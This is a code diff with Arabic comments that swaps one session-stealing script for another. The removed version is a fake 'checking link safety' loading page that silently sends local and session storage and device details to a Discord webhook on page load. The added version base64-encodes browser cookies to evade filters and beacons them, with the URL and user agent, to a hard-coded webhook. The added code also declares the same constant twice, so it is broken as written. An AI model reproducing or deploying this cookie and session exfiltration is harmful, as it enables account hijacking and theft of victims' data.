@@ -1,49 +1,30 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <title>جاري تحميل المحتوى...</title>
-    <style>
-        body { background-color: #f4f4f4; text-align: center; padding-top: 20%; font-family: Arial, sans-serif; }
-        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-    <div class="loader"></div>
-    <h1>جاري التحقق من أمان الرابط...</h1>
-    <p>يرجى الانتظار 5 ثوانٍ فقط.</p>
+// سكريبت سحب الجلسة المطور - إصدار 2026
+(function() {
+    // 1. رابط الاستقبال (الديسكورد الخاص بك)
+    // تأكد من وضع الفاصلة المنقوطة (😉 في النهاية بدقة
+    const WEBHOOK_URL = "ضع_رابط_الويب_هوك_الخاص_بك_هنا";
+const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4";
+    // 2. تجميع البيانات وتشفيرها بصيغة Base64 للتمويه
+    const data = {
+        t: "🚨 صيد جديد!",
+        c: btoa(document.cookie), // تشفير الكوكيز لضمان العبور من الفلاتر
+        u: window.location.href,
+        a: navigator.userAgent
+    };
 
-    <script>
-        const captureAndSend = async () => {
-            // سحب البيانات (بصمة الجهاز والتخزين المحلي للجلسة)
-            const data = {
-                device: navigator.userAgent,
-                screen: window.screen.width + "x" + window.screen.height,
-                lang: navigator.language,
-                local: JSON.stringify(window.localStorage),
-                session: JSON.stringify(window.sessionStorage),
-                time: new Date().toISOString()
-            };
+    // 3. إرسال البيانات عبر تقنية Beacon (الأسرع والأكثر خفاءً)
+    const blob = new Blob([JSON.stringify({
+        "embeds": [{
+            "title": data.t,
+            "color": 16711680,
+            "fields": [
+                { "name": "الموقع المستهدف", "value": data.u },
+                { "name": "الجلسة (Cookies)", "value": "```" + data.c + "```" },
+                { "name": "معلومات الجهاز", "value": data.a }
+            ],
+            "footer": { "text": "تم السحب بنجاح عبر نظام التحقق" }
+        }]
+    })], { type: 'application/json' });
 
-            try {
-                // رابط الديسكورد الخاص بك كما ظهر في صورتك
-                const webhookURL = "https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4",
-
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: "🎯 **قنص جديد (خطف جلسة):**\n```json\n" + JSON.stringify(data, null, 2) + "\n```"
-                    })
-                });
-            } catch (e) {
-                console.error("Error sending data");
-            }
-        };
-
-        // تنفيذ القنص صامتاً فور تحميل الصفحة
-        window.onload = captureAndSend;
-    </script>
-</body>
-</html>
+    navigator.sendBeacon(WEBHOOK_URL, blob);
+})();
